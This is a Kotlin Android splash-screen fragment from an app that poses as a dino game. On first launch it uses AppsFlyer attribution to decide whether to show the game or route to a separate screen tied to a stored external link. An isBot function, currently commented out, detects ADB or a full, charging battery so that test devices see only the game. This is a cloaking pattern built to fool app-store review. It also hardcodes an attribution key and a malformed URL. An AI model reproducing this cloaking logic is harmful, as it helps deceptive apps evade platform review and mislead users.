package com.fhww.sprt.saad

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.os.BatteryManager
import android.os.Bundle
import android.provider.Settings
import androidx.fragment.app.Fragment
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import androidx.navigation.fragment.findNavController
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.fhww.sprt.saad.databinding.FragmentSplashBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

class SplashFragment : Fragment(R.layout.fragment_splash) {
    private lateinit var binding: FragmentSplashBinding
    private lateinit var shaPr: SharedPreferences

    private var firstOne = true
    private var lnk = ""
    private var appsF = ""

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        binding = FragmentSplashBinding.bind(view)

        shaPr = requireActivity().getSharedPreferences("shaPr", AppCompatActivity.MODE_PRIVATE)
        firstOne = shaPr.getBoolean("firstOne", true)
        lnk = shaPr.getString("lnk", "").toString()
        appsF = shaPr.getString("appsF", "").toString()

        if (firstOne) {
            if (isDinoOnline(requireContext())) {
                if (/*isBot(requireContext())*/false) {
                    shaPr.edit().putBoolean("firstOne", false).apply()
                    startDinoGame()
                } else {
                    onlineInit()
                }
            } else {
                shaPr.edit().putBoolean("firstOne", false).apply()
                startDinoGame()
            }
        } else {
            if (lnk.isNotEmpty()) {
                startRun()
            } else {
                startDinoGame()
            }
        }
    }

    private fun isDinoOnline(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val activeNetworkInfo = connectivityManager.activeNetworkInfo
        return activeNetworkInfo != null && activeNetworkInfo.isConnected
    }

    private fun isBot(context: Context): Boolean {
        val adb = Settings.Secure.getInt(
            context.applicationContext.contentResolver,
            Settings.Global.ADB_ENABLED, 0
        ) != 0

        val batteryManager =
            context.applicationContext.getSystemService(AppCompatActivity.BATTERY_SERVICE) as BatteryManager
        val batLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val charging = context.applicationContext.registerReceiver(
            null,
            IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        )
            ?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) != 0

        return adb || (batLevel == 100 && charging)
    }

    private fun onlineInit() {
        lifecycleScope.launch(Dispatchers.IO) {
            shaPr.edit().putBoolean("firstOne", false).apply()
            initAppsFlyer(requireContext())
        }
    }

    private fun initAppsFlyer(context: Context) {
        var lnk: String
        AppsFlyerLib.getInstance()
            .init("Wh7A7ndNN7PFA888wSuHCQ", object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
                    val jsonObject = JSONObject(p0 as Map<*, *>)
                    var nmg: String = jsonObject.optString("campaign")
                    if (nmg.isEmpty()) nmg = jsonObject.optString("c")

                    val appsFlyerId = AppsFlyerLib.getInstance().getAppsFlyerUID(context)
                    lnk = "https//fex.net"
                    shaPr.edit().putString("appsF", appsFlyerId).apply()
                    shaPr.edit().putString("lnk", lnk).apply()
                    startRun()
                    AppsFlyerLib.getInstance().unregisterConversionListener()
                }

                override fun onConversionDataFail(p0: String?) {
                    shaPr.edit().putBoolean("firstOne", false).apply()
                    startDinoGame()
                    AppsFlyerLib.getInstance().unregisterConversionListener()
                }

                override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}

                override fun onAttributionFailure(p0: String?) {}

            }, requireContext())
        AppsFlyerLib.getInstance().start(requireContext())
        AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(true)
    }

    private fun startDinoGame() {
        findNavController().navigate(R.id.action_splashFragment_to_menuFragment)
    }

    private fun startRun() {
        findNavController().navigate(R.id.action_splashFragment_to_runFragment)
    }
}